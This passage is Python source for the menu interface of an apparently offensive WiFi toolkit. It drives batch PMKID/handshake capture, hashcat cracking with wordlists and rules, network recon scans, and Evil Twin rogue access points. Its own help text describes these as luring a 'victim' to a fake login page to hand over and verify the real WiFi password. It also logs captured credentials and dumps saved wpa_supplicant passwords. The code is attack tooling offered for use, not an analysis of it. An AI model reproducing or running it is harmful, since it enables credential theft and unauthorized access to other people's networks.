            con.print(f"  ANonce: [ok]{result['anonce'][:32]}...[/]")
        if result.get("num_frames"):
            con.print(f"  EAPOL frames: {result['num_frames']}")
        if result.get("files"):
            for f in result["files"]:
                con.print(f"  File: [dim]{f}[/]")
        Prompt.ask("\n[dim]Enter[/]")

    def _capture_batch(self):
        con.clear()
        con.print(Rule("[hdr]Batch Capture[/]", style="cyan"))
        tgts = self.db.get_targets()
        if not tgts:
            con.print("[warn]No targets[/]")
            Prompt.ask("\n[dim]Enter[/]")
            return
        con.print(f"  Targets: {len(tgts)}\n")
        iface = self.cfg.get("interface", "wlan1")
        captured = 0
        for t in tgts:
            bssid = str(_get_field(t, "bssid"))
            essid = str(_get_field(t, "essid", "Hidden"))
            con.print(f"[inf]{essid}[/] ({bssid})")
            cap = HandshakeCapture(iface)
            try:
                r = cap.capture_pmkid(bssid, essid, timeout=15)
                if "captured" in r.get("status", ""):
                    captured += 1
                    con.print(f"  [ok]CAPTURED![/]")
                else:
                    con.print(f"  [dim]{r.get('status')}[/]")
            except Exception as e:
                con.print(f"  [err]{e}[/]")
        con.print(f"\n  [hdr]{captured}/{len(tgts)} captured[/]")
        Prompt.ask("\n[dim]Enter[/]")

    def _analyze_captures(self):
        con.clear()
        con.print(Rule("[hdr]Analyze Captures[/]", style="cyan"))
        caps = HandshakeAnalyzer.list_captures()
        if not caps:
            con.print("[warn]No captures[/]")
            Prompt.ask("\n[dim]Enter[/]")
            return
        t = Table(box=box.ROUNDED, show_header=True, header_style="bold cyan")
        t.add_column("#", width=3); t.add_column("File"); t.add_column("Type")
        t.add_column("BSSID"); t.add_column("Crackable")
        for i, c in enumerate(caps, 1):
            ct = "[ok]Yes[/]" if c.get("crackable") else "[dim]No[/]"
            t.add_row(str(i), Path(c["file"]).name, c.get("type","?"),
                     c.get("bssid","-"), ct)
        con.print(t)
        sel = Prompt.ask("# to analyze (Enter skip)", default="")
        if sel:
            try:
                idx = int(sel) - 1
                if 0 <= idx < len(caps):
                    c = caps[idx]
                    con.print(f"\n  File: {c['file']}")
                    con.print(f"  Type: {c.get('type')}")
                    con.print(f"  Crackable: {c.get('crackable')}")
                    for s in c.get("suggestions", []):
                        con.print(f"  [cyan]{s}[/]")
            except: pass
        Prompt.ask("\n[dim]Enter[/]")

    def _list_captures(self):
        con.clear()
        con.print(Rule("[hdr]All Captures[/]", style="cyan"))
        caps = HandshakeAnalyzer.list_captures()
        if not caps:
            con.print("[warn]None[/]")
        else:
            for c in caps:
                con.print(f"  {Path(c['file']).name}")
                con.print(f"    Type: {c.get('type','?')} | {c.get('bssid','-')}")
        Prompt.ask("\n[dim]Enter[/]")

    def _crack_cmd(self):
        con.clear()
        con.print(Rule("[hdr]Crack Command[/]", style="cyan"))
        caps = HandshakeAnalyzer.list_captures()
        if not caps:
            con.print("[warn]No captures[/]")
            Prompt.ask("\n[dim]Enter[/]")
            return
        for i, c in enumerate(caps, 1):
            con.print(f"  [{i}] {Path(c['file']).name}")
        sel = IntPrompt.ask("Select #", default=1)
        if 1 <= sel <= len(caps):
            fp = caps[sel-1]["file"]
            wl = Prompt.ask("Wordlist", default=self.cfg.get("wordlist", "/usr/share/wordlists/rockyou.txt"))
            self.cfg.set("wordlist", wl)
            cmd = HandshakeAnalyzer.get_crack_command(fp, wl)
            if cmd:
                con.print(f"\n  [cyan]{cmd}[/]")
                if Confirm.ask("Run?", default=False):
                    try:
                        proc = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE,
                                               stderr=subprocess.STDOUT, text=True)
                        for line in iter(proc.stdout.readline, ""):
                            con.print(f"[dim]{line.rstrip()}[/]")
                        proc.wait()
                    except Exception as e:
                        con.print(f"[err]{e}[/]")
        Prompt.ask("\n[dim]Enter[/]")

    def view_hashcat(self):
        """Hashcat Cracker"""
        while True:
            con.clear()
            con.print(Rule("[hdr]Hashcat Cracker[/]", style="cyan"))
            hc = HashcatRunner()
            if not hc.is_installed():
                con.print("\n[err]hashcat not installed![/]")
                con.print("[dim]apt install hashcat[/]")
                Prompt.ask("\n[dim]Enter[/]")
                break
            con.print()
            con.print("  [mn]1[/] - Crack Capture File")
            con.print("  [mn]2[/] - Crack with Smart Wordlist")
            con.print("  [mn]3[/] - Crack with Rules")
            con.print("  [mn]4[/] - List Captures")
            con.print("  [mn]0[/] - Back\n")
            ch = Prompt.ask("Select", default="0")
            if ch == "0": break
            elif ch == "1":
                caps = hc.list_captures()
                if not caps:
                    con.print("[warn]No captures[/]")
                    Prompt.ask("\n[dim]Enter[/]")
                    continue
                for i, c in enumerate(caps, 1):
                    con.print(f"  [{i}] {c['name']}")
                sel = IntPrompt.ask("Select #", default=1)
                if sel < 1 or sel > len(caps): continue
                cap = caps[sel-1]["file"]
                wl = Prompt.ask("Wordlist", default=self.cfg.get("wordlist", "/usr/share/wordlists/rockyou.txt"))
                self.cfg.set("wordlist", wl)
                con.print("\n[hdr]Cracking...[/]\n")
                def cb1(line):
                    if ":" in line and len(line) > 10: con.print(f"[ok]{line}[/]")
                    elif "%" in line: con.print(f"[inf]{line}[/]")
                    else: con.print(f"[dim]{line}[/]")
                try: result = hc.crack(cap, wl, callback=cb1)
                except KeyboardInterrupt: hc.stop(); result = {"status": "stopped"}
                con.print(f"\n  Status: {result.get('status')}")
                if result.get("password"):
                    con.print(f"  [ok]PASSWORD: {result['password']}[/]")
                    self.db.add_credential("", "", None, result["password"], "hashcat")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "2":
                caps = hc.list_captures()
                if not caps:
                    con.print("[warn]No captures[/]")
                    Prompt.ask("\n[dim]Enter[/]")
                    continue
                for i, c in enumerate(caps, 1):
                    con.print(f"  [{i}] {c['name']}")
                sel = IntPrompt.ask("Select #", default=1)
                cap = caps[sel-1]["file"]
                essid = Prompt.ask("ESSID")
                brand = Prompt.ask("Brand", default="")
                con.print("[inf]Generating wordlist...[/]")
                from modules.wordlist import WordlistGenerator
                gen = WordlistGenerator()
                words = gen.generate_for_network(essid, brand=brand, max_words=10000)
                wl_path = "/tmp/wl_smart.txt"
                with open(wl_path, "w") as f:
                    for w in words: f.write(w + "\n")
                con.print(f"[ok]{len(words)} passwords[/]\n")
                def cb2(line):
                    if ":" in line and len(line) > 10: con.print(f"[ok]{line}[/]")
                    else: con.print(f"[dim]{line}[/]")
                try: result = hc.crack(cap, wl_path, callback=cb2)
                except KeyboardInterrupt: hc.stop(); result = {"status": "stopped"}
                con.print(f"\n  Status: {result.get('status')}")
                if result.get("password"): con.print(f"  [ok]PASSWORD: {result['password']}[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "3":
                caps = hc.list_captures()
                if not caps:
                    con.print("[warn]No captures[/]")
                    Prompt.ask("\n[dim]Enter[/]")
                    continue
                for i, c in enumerate(caps, 1):
                    con.print(f"  [{i}] {c['name']}")
                sel = IntPrompt.ask("Select #", default=1)
                cap = caps[sel-1]["file"]
                wl = Prompt.ask("Wordlist", default=self.cfg.get("wordlist", "/usr/share/wordlists/rockyou.txt"))
                self.cfg.set("wordlist", wl)
                rules = Prompt.ask("Rules", default="/usr/share/hashcat/rules/best64.rule")
                def cb3(line):
                    if ":" in line and len(line) > 10: con.print(f"[ok]{line}[/]")
                    else: con.print(f"[dim]{line}[/]")
                try: result = hc.crack(cap, wl, rules=rules, callback=cb3)
                except KeyboardInterrupt: hc.stop(); result = {"status": "stopped"}
                con.print(f"\n  Status: {result.get('status')}")
                if result.get("password"): con.print(f"  [ok]PASSWORD: {result['password']}[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "4":
                caps = hc.list_captures()
                if caps:
                    for i, c in enumerate(caps, 1):
                        con.print(f"  [{i}] {c['name']} ({c['size']} bytes)")
                else:
                    con.print("[warn]No captures[/]")
                Prompt.ask("\n[dim]Enter[/]")

    def view_recon(self):
        """Network Reconnaissance"""
        while True:
            con.clear()
            con.print(Rule("[hdr]Network Recon[/]", style="cyan"))
            recon = NetworkRecon()
            gw = recon.get_gateway()
            local = recon.get_local_ip()
            con.print(f"\n  Local: [inf]{local}[/]  Gateway: [inf]{gw}[/]")
            con.print()
            con.print("  [mn]1[/] - Ping Scan (discover devices)")
            con.print("  [mn]2[/] - Port Scan")
            con.print("  [mn]3[/] - OS Detection")
            con.print("  [mn]4[/] - Traceroute")
            con.print("  [mn]5[/] - WiFi Scan")
            con.print("  [mn]6[/] - Full Recon")
            con.print("  [mn]0[/] - Back\n")
            ch = Prompt.ask("Select", default="0")
            if ch == "0": break
            elif ch == "1":
                target = Prompt.ask("Subnet", default=recon.get_subnet())
                con.print(f"\n[inf]Scanning {target}...[/]\n")
                hosts = recon.ping_scan(target)
                if isinstance(hosts, dict) and hosts.get("error"):
                    con.print(f"[err]{hosts['error']}[/]")
                elif hosts:
                    t = Table(box=box.ROUNDED, show_header=True, header_style="bold cyan")
                    t.add_column("#", width=3); t.add_column("IP")
                    t.add_column("Hostname"); t.add_column("MAC"); t.add_column("Vendor")
                    for i, h in enumerate(hosts, 1):
                        t.add_row(str(i), h.get("ip",""), h.get("hostname","-"),
                                 h.get("mac","-"), h.get("vendor","-"))
                    con.print(t)
                    con.print(f"\n  Found: {len(hosts)} devices")
                else:
                    con.print("[warn]No devices found[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "2":
                target = Prompt.ask("Target IP", default=gw)
                ports = Prompt.ask("Ports", default="21,22,23,80,443,8080,8443")
                con.print(f"\n[inf]Scanning {target}...[/]\n")
                results = recon.port_scan(target, ports)
                if isinstance(results, dict) and results.get("error"):
                    con.print(f"[err]{results['error']}[/]")
                elif results:
                    t = Table(box=box.ROUNDED, show_header=True, header_style="bold cyan")
                    t.add_column("Port", width=6); t.add_column("State")
                    t.add_column("Service"); t.add_column("Version")
                    for r in results:
                        t.add_row(str(r["port"]), "[ok]open[/]", r["service"], r.get("version","-"))
                    con.print(t)
                else:
                    con.print("[warn]No open ports[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "3":
                target = Prompt.ask("Target IP", default=gw)
                con.print(f"\n[inf]Detecting OS on {target}...[/]\n")
                result = recon.os_detect(target)
                if result.get("detected"):
                    for info in result["detected"]:
                        con.print(f"  [ok]{info}[/]")
                else:
                    con.print("[warn]Could not detect OS[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "4":
                target = Prompt.ask("Target", default=gw)
                con.print(f"\n[inf]Traceroute to {target}...[/]\n")
                hops = recon.traceroute(target)
                for hop in hops:
                    con.print(f"  {hop['hop']:3d}  {hop['info']}")
                if not hops: con.print("[warn]traceroute failed[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "5":
                con.print("\n[inf]WiFi scan...[/]\n")
                nets = recon.wifi_scan()
                if nets:
                    t = Table(box=box.ROUNDED, show_header=True, header_style="bold cyan")
                    t.add_column("#", width=3); t.add_column("ESSID")
                    t.add_column("BSSID"); t.add_column("CH"); t.add_column("RSSI")
                    for i, n in enumerate(nets, 1):
                        t.add_row(str(i), n["essid"], n["bssid"],
                                 str(n["channel"]), str(n["rssi"]))
                    con.print(t)
                else: con.print("[warn]No networks[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "6":
                target = Prompt.ask("Target IP", default=gw)
                con.print(f"\n[hdr]Full Recon on {target}[/]\n")
                con.print("[dim]1. Port scan...[/]")
                ports = recon.port_scan(target)
                if isinstance(ports, list):
                    for p in ports:
                        con.print(f"  [ok]Port {p['port']}: {p['service']}[/]")
                con.print("\n[dim]2. OS detection...[/]")
                os_info = recon.os_detect(target)
                if os_info.get("detected"):
                    for info in os_info["detected"]:
                        con.print(f"  [inf]{info}[/]")
                Prompt.ask("\n[dim]Enter[/]")

    def view_evil_twin(self):
        """Evil Twin + Captive Portal"""
        while True:
            con.clear()
            con.print(Rule("[hdr]Evil Twin Attack[/]", style="cyan"))
            con.print("[dim]Rogue AP + captive portal to capture WiFi passwords[/]")
            con.print()
            try:
                r = subprocess.run(["iw", "dev"], capture_output=True, text=True, timeout=5)
                ifaces = re.findall(r"Interface (\S+)", r.stdout)
            except:
                ifaces = []
            con.print(f"  Interfaces: {', '.join(ifaces) if ifaces else 'None'}")
            con.print()
            con.print("  [mn]1[/] - Select Target from Database")
            con.print("  [mn]2[/] - Enter ESSID Manually")
            con.print("  [mn]3[/] - View Captured Credentials")
            con.print("  [mn]4[/] - Cleanup Portal Files")
            con.print("  [mn]0[/] - Back\n")
            ch = Prompt.ask("Select", default="0")
            if ch == "0":
                break
            elif ch == "1":
                nets = self.db.get_all_networks()
                if not nets:
                    con.print("[warn]No networks. Scan first.[/]")
                    Prompt.ask("\n[dim]Enter[/]")
                    continue
                net_table(nets, "Select Target")
                sel = Prompt.ask("# or BSSID", default="1")
                try:
                    idx = int(sel)
                    if 1 <= idx <= len(nets):
                        n = nets[idx-1]
                        essid = str(_get_field(n, "essid", "Unknown"))
                        ch_val = int(_get_field(n, "channel", 6))
                    else:
                        continue
                except:
                    continue
                self._run_evil_twin(essid, ch_val, ifaces)
            elif ch == "2":
                essid = Prompt.ask("ESSID")
                if not essid:
                    continue
                ch_val = IntPrompt.ask("Channel", default=6)
                self._run_evil_twin(essid, ch_val, ifaces)
            elif ch == "3":
                cf = Path("/tmp/evil_twin/captured.txt")
                if cf.exists():
                    with open(cf) as f:
                        creds = f.readlines()
                    if creds:
                        con.print("[ok]Captured:[/]")
                        for line in creds:
                            con.print(f"  [ok]{line.strip()}[/]")
                    else:
                        con.print("[dim]None yet[/]")
                else:
                    con.print("[dim]No Evil Twin run yet[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "4":
                cleanup_portal()
                con.print("[ok]Cleaned up[/]")
                Prompt.ask("\n[dim]Enter[/]")

    def _run_evil_twin(self, essid, channel, ifaces):
        con.clear()
        con.print(Rule("[hdr]Evil Twin Launch[/]", style="cyan"))
        con.print(f"\n  Target: [warn]{essid}[/] (CH {channel})\n")
        ap_iface = "wlan1"
        for iface in ifaces:
            if iface != self.cfg.get("interface", "wlan0"):
                ap_iface = iface
                break
        ap_iface = Prompt.ask("AP Interface", default=ap_iface)
        con.print(f"\n  AP: [inf]{ap_iface}[/]  Target: [warn]{essid}[/]  CH: [inf]{channel}[/]")
        if not Confirm.ask("\nStart?", default=True):
            return
        et = EvilTwin(ap_iface, essid, channel)
        def cb(line):
            ll = line.lower()
            if "captured" in ll or "credential" in ll:
                con.print(f"[ok]{line}[/]")
            elif "[+]" in line:
                con.print(f"[ok]{line}[/]")
            elif "[!]" in ll or "error" in ll or "failed" in ll:
                con.print(f"[err]{line}[/]")
            elif "active" in ll or "started" in ll:
                con.print(f"[hdr]{line}[/]")
            else:
                con.print(f"[dim]{line}[/]")
        et.callback = cb
        try:
            ok = et.start()
            if ok:
                con.print("\n[ok]Evil Twin running![/]")
                con.print("[dim]Ctrl+C to stop[/]\n")
                while et.running:
                    time.sleep(5)
            else:
                con.print("[err]Failed[/]")
        except KeyboardInterrupt:
            con.print("\n[warn]Stopping...[/]")
            et.stop()
        creds = et.get_captured()
        if creds:
            con.print(f"\n[ok]CAPTURED:[/]")
            for c in creds:
                con.print(f"  [ok]{c}[/]")
                m = re.search(r"Password:(.+)", c)
                if m:
                    self.db.add_credential("", essid, None, m.group(1).strip(), "evil_twin")
                    self.db.log("capture", "evil_twin", f"Password: {m.group(1).strip()}", "ok")
        else:
            con.print("\n[dim]No credentials captured[/]")
        Prompt.ask("\n[dim]Enter[/]")

    def view_wpa2_evil_twin(self):
        """WPA2 Evil Twin - captures real WiFi passwords"""
        while True:
            con.clear()
            con.print(Rule("[hdr]WPA2 Evil Twin - Password Capture[/]", style="cyan"))
            con.print("[dim]Captures real WiFi passwords via captive portal + verification[/]\n")
            con.print("  [mn]1[/] - Select Target from Database")
            con.print("  [mn]2[/] - Enter ESSID Manually")
            con.print("  [mn]3[/] - View Verified Passwords")
            con.print("  [mn]4[/] - View All Attempts")
            con.print("  [mn]0[/] - Back\n")
            ch = Prompt.ask("Select", default="0")
            if ch == "0":
                break
            elif ch == "1":
                nets = self.db.get_all_networks()
                if not nets:
                    con.print("[warn]No networks. Scan first.[/]")
                    Prompt.ask("\n[dim]Enter[/]")
                    continue
                net_table(nets, "Select Target")
                sel = Prompt.ask("# or BSSID", default="1")
                try:
                    idx = int(sel)
                    if 1 <= idx <= len(nets):
                        n = nets[idx-1]
                        essid = str(_get_field(n, "essid", "Unknown"))
                        ch_val = int(_get_field(n, "channel", 6))
                        bssid = str(_get_field(n, "bssid", ""))
                    else:
                        continue
                except:
                    continue
                self._launch_wpa2_et(essid, ch_val, bssid)
            elif ch == "2":
                essid = Prompt.ask("ESSID")
                if not essid:
                    continue
                bssid = Prompt.ask("BSSID", default="")
                ch_val = IntPrompt.ask("Channel", default=6)
                self._launch_wpa2_et(essid, ch_val, bssid)
            elif ch == "3":
                vf = Path("/tmp/wpa2_evil_twin/verified.txt")
                if vf.exists():
                    with open(vf) as f:
                        lines = f.readlines()
                    if lines:
                        con.print("[ok]Verified passwords:[/]")
                        for l in lines:
                            con.print(f"  [ok]{l.strip()}[/]")
                    else:
                        con.print("[dim]None yet[/]")
                else:
                    con.print("[dim]No attack run yet[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "4":
                cf = Path("/tmp/wpa2_evil_twin/captured.txt")
                if cf.exists():
                    with open(cf) as f:
                        lines = f.readlines()
                    if lines:
                        con.print("[inf]All attempts:[/]")
                        for l in lines:
                            con.print(f"  [dim]{l.strip()}[/]")
                    else:
                        con.print("[dim]None yet[/]")
                else:
                    con.print("[dim]No attack run yet[/]")
                Prompt.ask("\n[dim]Enter[/]")

    def _launch_wpa2_et(self, essid, channel, bssid):
        con.clear()
        con.print(Rule("[hdr]WPA2 Evil Twin Launch[/]", style="cyan"))
        con.print(f"\n  Target: [warn]{essid}[/] ({bssid}) CH:{channel}\n")
        con.print("[dim]How it works:[/]")
        con.print("[dim]  1. Open AP with same name as target[/]")
        con.print("[dim]  2. Victim connects -> login page[/]")
        con.print("[dim]  3. Victim enters WiFi password[/]")
        con.print("[dim]  4. We verify against real AP[/]")
        con.print("[dim]  5. If works = REAL PASSWORD!\n[/]")
        ifaces = []
        try:
            r = subprocess.run(["iw", "dev"], capture_output=True, text=True, timeout=5)
            ifaces = re.findall(r"Interface (\S+)", r.stdout)
        except:
            pass
        ap_iface = "wlan1"
        for iface in ifaces:
            if iface != self.cfg.get("interface", "wlan0"):
                ap_iface = iface
                break
        ap_iface = Prompt.ask("AP Interface", default=ap_iface)
        if not Confirm.ask("Start?", default=True):
            return
        et = Wpa2EvilTwin(ap_iface, essid, channel, bssid if bssid else None)
        def cb(line):
            ll = line.lower()
            if "verified" in ll or "real" in ll:
                con.print(f"[ok]{line}[/]")
            elif "[+]" in line:
                con.print(f"[ok]{line}[/]")
            elif "[!]" in ll or "error" in ll:
                con.print(f"[err]{line}[/]")
            else:
                con.print(f"[dim]{line}[/]")
        et.callback = cb
        try:
            ok = et.start_captive_attack()
            if ok:
                con.print("\n[ok]WPA2 Evil Twin running![/]")
                con.print("[dim]Ctrl+C to stop[/]\n")
                while et.running:
                    time.sleep(5)
            else:
                con.print("[err]Failed[/]")
        except KeyboardInterrupt:
            con.print("\n[warn]Stopping...[/]")
            et.stop()
        verified = et.get_verified_passwords()
        if verified:
            con.print("\n[ok]VERIFIED PASSWORDS:[/]")
            for pw in verified:
                con.print(f"  [ok]{pw}[/]")
                self.db.add_credential("", essid, None, pw, "wpa2_evil_twin")
                self.db.log("cracked", "evil_twin", f"Password: {pw}", "ok")
        Prompt.ask("\n[dim]Enter[/]")

    def view_wpa(self):
        """wpa_supplicant Manager"""
        wpa = WpaSupplicant(self.cfg.get("interface", "wlan1"))
        while True:
            con.clear()
            con.print(Rule("[hdr]wpa_supplicant Manager[/]", style="cyan"))
            status = wpa.status()
            st_c = "ok" if status["running"] else "dim"
            st_txt = status["state"] if status["running"] else "NOT RUNNING"
            t = Table(box=box.SIMPLE, show_header=False, padding=(0,2))
            t.add_column("K", style="dim", min_width=18)
            t.add_column("V", style="cyan")
            t.add_row("Interface", wpa.iface)
            t.add_row("Status", f"[{st_c}]{st_txt}[/]")
            t.add_row("State", status.get("state", "N/A"))
            t.add_row("SSID", status.get("ssid", "-") or "-")
            t.add_row("BSSID", status.get("bssid", "-") or "-")
            t.add_row("IP", status.get("ip", "-") or "-")
            t.add_row("Key Mgmt", status.get("key_mgmt", "-") or "-")
            con.print(Panel(t, title="wpa_supplicant Status", border_style="cyan"))
            con.print()
            con.print("  [mn]1[/] - Start  [mn]2[/] - Stop  [mn]3[/] - Scan")
            con.print("  [mn]4[/] - Connect  [mn]5[/] - Hidden  [mn]6[/] - Enterprise")
            con.print("  [mn]7[/] - Disconnect  [mn]8[/] - List Saved")
            con.print("  [mn]9[/] - Remove  [mn]10[/] - Extract Passwords")
            con.print("  [mn]11[/] - Signal  [mn]12[/] - WPS PIN  [mn]13[/] - WPS PBC")
            con.print("  [mn]14[/] - Raw Status  [mn]15[/] - Reconfigure")
            con.print("  [mn]16[/] - Save Scan to DB  [mn]0[/] - Back\n")
            ch = Prompt.ask("Select", default="0")
            if ch == "0":
                break
            elif ch == "1":
                conf = Prompt.ask("Config (Enter=auto)", default="")
                if wpa.start(conf if conf else None):
                    con.print("[ok]Started[/]")
                else:
                    con.print("[err]Failed[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "2":
                wpa.stop(); con.print("[ok]Stopped[/]"); Prompt.ask("\n[dim]Enter[/]")
            elif ch == "3":
                if not wpa.is_running():
                    con.print("[warn]Start first![/]"); Prompt.ask("\n[dim]Enter[/]"); continue
                con.print("  Scanning...")
                nets = wpa.scan_results()
                if nets:
                    net_table(nets, f"wpa_cli Scan ({len(nets)})")
                    nc = 0
                    for n in nets:
                        if not self.db.get_network(n["bssid"]): nc += 1
                        self.db.add_network(n)
                    con.print(f"\n  [ok]{len(nets)} ({nc} new) saved[/]")
                else:
                    con.print("[warn]No results[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "4":
                if not wpa.is_running():
                    con.print("[warn]Start first![/]"); Prompt.ask("\n[dim]Enter[/]"); continue
                ssid = Prompt.ask("SSID")
                psk = Prompt.ask("Password (empty=open)", default="")
                ok, msg = wpa.connect(ssid, psk if psk else None)
                con.print(f"[ok]{msg}[/]" if ok else f"[err]{msg}[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "5":
                if not wpa.is_running():
                    con.print("[warn]Start first![/]"); Prompt.ask("\n[dim]Enter[/]"); continue
                ssid = Prompt.ask("Hidden SSID")
                psk = Prompt.ask("Password", default="")
                ok, msg = wpa.connect_hidden(ssid, psk if psk else None)
                con.print(f"[ok]{msg}[/]" if ok else f"[err]{msg}[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "6":
                if not wpa.is_running():
                    con.print("[warn]Start first![/]"); Prompt.ask("\n[dim]Enter[/]"); continue
                ssid = Prompt.ask("SSID")
                identity = Prompt.ask("Username")
                password = Prompt.ask("Password")
                eap = Prompt.ask("EAP", default="PEAP")
                ok, msg = wpa.connect_eap(ssid, identity, password, eap)
                con.print(f"[ok]{msg}[/]" if ok else f"[err]{msg}[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "7":
                wpa.disconnect(); con.print("[ok]Disconnected[/]"); Prompt.ask("\n[dim]Enter[/]")
            elif ch == "8":
                nets = wpa.list_networks()
                if nets:
                    for n in nets:
                        con.print(f"  [{n['id']}] {n['ssid']} ({n['bssid']})")
                else:
                    con.print("[dim]No saved networks[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "9":
                nets = wpa.list_networks()
                if nets:
                    for n in nets:
                        con.print(f"  [{n['id']}] {n['ssid']}")
                    nid = Prompt.ask("ID (or 'all')")
                    if nid.lower() == "all":
                        wpa.remove_network("all")
                    else:
                        wpa.remove_network(nid)
                    wpa.save_config(); con.print("[ok]Removed[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "10":
                pwds = wpa.get_saved_passwords()
                if pwds:
                    for p in pwds:
                        con.print(f"  {p['ssid']}: [ok]{p['psk']}[/]")
                else:
                    con.print("[dim]No saved passwords[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "11":
                sig = wpa.signal_poll()
                if sig:
                    for k, v in sig.items():
                        con.print(f"  {k}: [cyan]{v}[/]")
                else:
                    con.print("[dim]Not connected[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "12":
                b = Prompt.ask("BSSID (Enter=any)", default="")
                p = Prompt.ask("PIN (Enter=auto)", default="")
                ok, out = wpa.wps_pin(b if b else None, p if p else None)
                con.print(f"[ok]{out}[/]" if ok else f"[err]{out}[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "13":
                b = Prompt.ask("BSSID (Enter=any)", default="")
                ok, out = wpa.wps_pbc(b if b else None)
                con.print(f"[ok]{out}[/]" if ok else f"[err]{out}[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "14":
                out, _ = wpa._cli("status")
                con.print(Panel(out, title="Raw Status"))
                out2, _ = wpa._cli("list_networks")
                con.print(Panel(out2, title="Saved"))
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "15":
                wpa.reconfigure(); con.print("[ok]Done[/]"); Prompt.ask("\n[dim]Enter[/]")
            elif ch == "16":
                nets = wpa.scan_results()
                if nets:
                    for n in nets:
                        self.db.add_network(n)
                    con.print(f"[ok]{len(nets)} saved[/]")
                else:
                    con.print("[warn]None[/]")
                Prompt.ask("\n[dim]Enter[/]")

    def view_settings(self):
        while True:
            con.clear()
            con.print(Rule("[hdr]Settings[/]", style="cyan"))
            t = Table(box=box.SIMPLE, show_header=False, padding=(0,2))
            t.add_column("K", style="dim", min_width=20)
            t.add_column("V", style="cyan")
            for k, v in self.cfg.data.items():
                t.add_row(k, str(v))
            con.print(Panel(t, title="Settings", border_style="cyan"))
            con.print("\n  [mn]1[/] Interface  [mn]2[/] ose.py Path")
            con.print("  [mn]3[/] Scan Timeout  [mn]4[/] Toggle Verbose")
            con.print("  [mn]5[/] Backup  [mn]6[/] Reset  [mn]0[/] Back\n")
            ch = Prompt.ask("Select", default="0")
            if ch == "0":
                break
            elif ch == "1":
                v = Prompt.ask("Interface", default=self.cfg.get("interface"))
                self.cfg.set("interface", v); con.print("[ok]Done[/]")
            elif ch == "2":
                v = Prompt.ask("Path", default=self.cfg.get("ose_path"))
                self.cfg.set("ose_path", v); con.print("[ok]Done[/]")
            elif ch == "3":
                v = IntPrompt.ask("Timeout", default=self.cfg.get("scan_timeout"))
                self.cfg.set("scan_timeout", v); con.print("[ok]Done[/]")
            elif ch == "4":
                v = not self.cfg.get("verbose")
                self.cfg.set("verbose", v); con.print(f"[ok]Verbose: {v}[/]")
            elif ch == "5":
                con.print(f"[ok]{self.db.backup()}[/]")
            elif ch == "6":
                if Confirm.ask("[err]Reset?[/]"):
                    self.cfg.data = self.cfg.DEFAULTS.copy()
                    self.cfg.save(); con.print("[ok]Done[/]")
            Prompt.ask("\n[dim]Enter[/]")


def main():
    def sig_handler(sig, frame):
        con.print("\n[warn]Shutdown...[/]")
        sys.exit(0)
    signal.signal(signal.SIGINT, sig_handler)
    signal.signal(signal.SIGTERM, sig_handler)
    App().run()

if __name__ == "__main__":
    main()
